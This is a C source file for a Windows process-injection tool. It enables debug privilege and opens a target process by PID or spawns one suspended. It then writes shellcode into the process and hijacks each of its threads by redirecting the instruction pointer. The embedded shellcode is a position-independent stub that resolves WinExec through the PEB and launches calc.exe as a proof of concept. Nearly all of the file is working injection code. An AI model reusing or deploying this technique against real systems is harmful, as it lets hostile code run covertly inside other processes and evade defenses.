#include "stdafx.h"
#include <Windows.h>
#include <TlHelp32.h>
#include "accctrl.h"
#include "aclapi.h"
#pragma comment(lib, "advapi32.lib")

void debug(const char* format, ...) { 
  va_list args;
  va_start (args, format);
  vfprintf (stdout, format, args);
  va_end (args);
}

BOOL injectThreads(DWORD pid,int(*callback)(DWORD,DWORD)){
  DWORD i;
  HANDLE hSnapshot;  
  THREADENTRY32 te;
  BOOL found=0;
  
  hSnapshot = (void *)CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
  te.dwSize = 28;
  for ( i = Thread32First(hSnapshot, &te); i; i = Thread32Next(hSnapshot, &te) )
  {
    if(te.th32OwnerProcessID==pid) 
    {
      callback(pid,te.th32ThreadID);
      found=1;
    }
  }
  return found;
}
void SeDebugPrivileges(void)
{
  void* tokenHandle;
  OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle);
  TOKEN_PRIVILEGES privilegeToken;
  LookupPrivilegeValue(0, SE_DEBUG_NAME, &privilegeToken.Privileges[0].Luid);
  privilegeToken.PrivilegeCount = 1;
  privilegeToken.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
  AdjustTokenPrivileges(tokenHandle, 0, &privilegeToken, sizeof(TOKEN_PRIVILEGES), 0, 0);
  CloseHandle(tokenHandle);
}
static const UCHAR shellcode_WinExecCalc[] = {
  0x31, 0xC9, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x70, 0x14, 0xAD, 0x96,
  0xAD, 0x8B, 0x58, 0x10, 0x8B, 0x53, 0x3C, 0x01, 0xDA, 0x8B, 0x52, 0x78, 0x01, 0xDA, 0x8B, 0x72,
  0x20, 0x01, 0xDE, 0x31, 0xC9, 0x41, 0xAD, 0x01, 0xD8, 0x81, 0x38, 0x47, 0x65, 0x74, 0x50, 0x75,
  0xF4, 0x81, 0x78, 0x04, 0x72, 0x6F, 0x63, 0x41, 0x75, 0xEB, 0x81, 0x78, 0x08, 0x64, 0x64, 0x72,
  0x65, 0x75, 0xE2, 0x8B, 0x72, 0x24, 0x01, 0xDE, 0x66, 0x8B, 0x0C, 0x4E, 0x49, 0x8B, 0x72, 0x1C,
  0x01, 0xDE, 0x8B, 0x14, 0x8E, 0x01, 0xDA, 0x31, 0xF6, 0x52, 0x5E, 0x31, 0xFF, 0x53, 0x5F, 0x31,
  0xC9, 0x51, 0x68, 0x78, 0x65, 0x63, 0x00, 0x68, 0x57, 0x69, 0x6E, 0x45, 0x89, 0xE1, 0x51, 0x53,
  0xFF, 0xD2, 0x31, 0xC9, 0x51, 0x68, 0x65, 0x73, 0x73, 0x00, 0x68, 0x50, 0x72, 0x6F, 0x63, 0x68,
  0x45, 0x78, 0x69, 0x74, 0x89, 0xE1, 0x51, 0x57, 0x31, 0xFF, 0x89, 0xC7, 0xFF, 0xD6, 0x31, 0xF6,
  0x50, 0x5E, 0x31, 0xC9, 0x51, 0x68, 0x2E, 0x65, 0x78, 0x65, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x89,
  0xE1, 0x6A, 0x00, 0x51, 0xFF, 0xD7, 0x6A, 0x00, 0xFF, 0xD6, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00,
  0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00
};
int inject_sc(DWORD pid, DWORD tid){
  HANDLE hProcess, hThread;
  CONTEXT Context;

  debug("main():pid=%d tid=%d\n", pid, tid);
  
  hProcess=OpenProcess(PROCESS_ALL_ACCESS,0,pid);
  if(!hProcess){    
    debug("main():OpenProcess(): %d",GetLastError());
    return 1;
  }
  #define QUERY_INFORMATION 0x40
  #define GET_CONTEXT 0x08
  if(!(hThread=OpenThread(THREAD_ALL_ACCESS/*QUERY_INFORMATION|GET_CONTEXT*//*THREAD_ALL_ACCESS*/, 0, tid))){
    debug("main():OpenThread(): %d",GetLastError());
    return 1;
  }  
  
  if(SuspendThread(hThread)==-1){
    debug("main():SuspendThread(): error %d\n",GetLastError());
    return 1;
  }else{ 
    debug("main():SuspendThread(): OK\n",hThread);
  }
  memset(&Context,0,sizeof(CONTEXT));
  Context.ContextFlags = CONTEXT_CONTROL|CONTEXT_INTEGER;//CONTEXT_FULL;
  
  if(!GetThreadContext(hThread, &Context)){
    debug("main():GetThreadContext(): hThread=%d error %d",hThread,GetLastError());
    ResumeThread(hThread);
    return 1;
  }
  void *address;  
  if(!(address=VirtualAllocEx(hProcess,0,sizeof(shellcode_WinExecCalc),4096,64)))
  {
    debug("main():VirtualAlloc(): error %d",GetLastError());
    ResumeThread(hThread);
    return 1;
  }
  if (!WriteProcessMemory((HANDLE)hProcess, address, (LPCVOID)shellcode_WinExecCalc, sizeof(shellcode_WinExecCalc), 0)){
    debug("main():WriteProcessMemory(): error %d",GetLastError());
    ResumeThread(hThread);
    return 1;
  }
  debug("main():Context.Eax=0x%x Context.Eip=0x%x sc_address=0x%x\n",Context.Eax,Context.Eip,address);
  Context.Eip = (DWORD)address;  // Context.Eax is also valid if process is launched suspended
  Context.ContextFlags = CONTEXT_CONTROL|CONTEXT_INTEGER;//CONTEXT_FULL;
  if ( !SetThreadContext(hThread, &Context) ){
    debug("main():SetThreadContext() error %d\n",GetLastError());
  }
  ResumeThread(hThread);
}
PROCESS_INFORMATION *launchProcess(LPCSTR sCmd){
	STARTUPINFO         sInfo;
	static PROCESS_INFORMATION pInfo;

	debug("launchProcess(): sCmd: %s\n",sCmd);
	ZeroMemory(&sInfo, sizeof(sInfo));
	sInfo.cb = sizeof(sInfo);
	ZeroMemory(&pInfo, sizeof(pInfo));

	if (CreateProcessA(sCmd, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&sInfo, &pInfo))
	{		
		debug("launchProcess(): pInfo.dwProcessId=%d\n",pInfo.dwProcessId);    
    
  }
  return &pInfo;
}
void spawnAndInject(LPCSTR sCmd)
{
  DWORD pid;
  HANDLE hThread;
  PROCESS_INFORMATION *info;
  info=launchProcess(sCmd);
  pid=info->dwProcessId;
  hThread=info->hThread;  
  if(pid)
  {
    injectThreads(pid,inject_sc);
    ResumeThread(hThread);
  }
  else
    debug("main(): launchProcess(): err %d\n",GetLastError());
}
void injectPID(DWORD pid)
{
  if(!injectThreads(pid,inject_sc)) debug("InjectPID(): pid not found\n");
}
int main(int argc, char* argv[])
{
  SeDebugPrivileges();
  
  //spawnAndInject("C:\\Windows\\SysWOW64\\notepad.exe");
  injectPID(14304);
  debug("ok, press any key to exit...\n");
  getchar();
  return 0;
}

